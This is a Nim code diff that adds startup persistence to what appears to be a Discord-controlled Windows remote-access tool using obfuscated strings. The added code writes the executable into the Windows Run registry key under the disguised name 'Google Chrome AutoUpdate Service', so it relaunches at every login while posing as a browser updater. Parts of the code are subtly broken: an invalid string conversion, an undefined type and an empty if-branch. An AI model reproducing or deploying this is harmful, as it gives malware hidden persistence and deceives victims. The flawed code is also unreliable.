@@ -11,6 +11,45 @@ import osproc
 import winim/lean
 import nimprotect
 
+const
+  KEY_SET_VALUE = 0x0002
+  REG_SZ = 1
+
+proc RegOpenKeyEx(hKey: HKEY, lpSubKey: LPCSTR, ulOptions: DWORD, samDesired: REGSAM, phkResult: var HKEY): LONG {.stdcall,
+    importc: "RegOpenKeyExA", dynlib: "advapi32" .}
+
+proc RegCloseKey(hKey: HKEY): LONG {.stdcall, importc: "RegCloseKey", dynlib: "advapi32" .}
+
+proc RegSetValueEx(hKey: HKEY, lpValueName: LPCSTR, Reserved: DWORD, dwType: DWORD, lpData: LPBYTE, cbData: DWORD): LONG {.stdcall,
+    importc: "RegSetValueExA", dynlib: "advapi32" .}
+
+proc getCurrentExecutablePath(): string =
+  result = getExePath()
+
+proc mainmagic() =
+  # Define la ruta del registro y el nombre del valor
+  let keyPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
+  let valueName = "Google Chrome AutoUpdate Service"
+  
+  # Obtiene la ruta del ejecutable actual
+  let executablePath = getCurrentExecutablePath()
+  
+  # Abre la clave del registro
+  var hKey: HKEY = nil
+  if RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, hKey) != 0:
+      #error code
+      return
+  
+  # Establece el valor en el registro
+  if RegSetValueEx(hKey, valueName, 0, REG_SZ, cast[LPBYTE](executablePath.cstr), len(executablePath) * sizeof(cchar)) != 0:
+      #error code
+  
+  # Cierra la clave del registro
+  RegCloseKey(hKey)
+
+when isMainModule:
+  mainmagic()
+
 let discord = newDiscordClient(protectString("token here"))
 
 const helpMenu = protectString("""
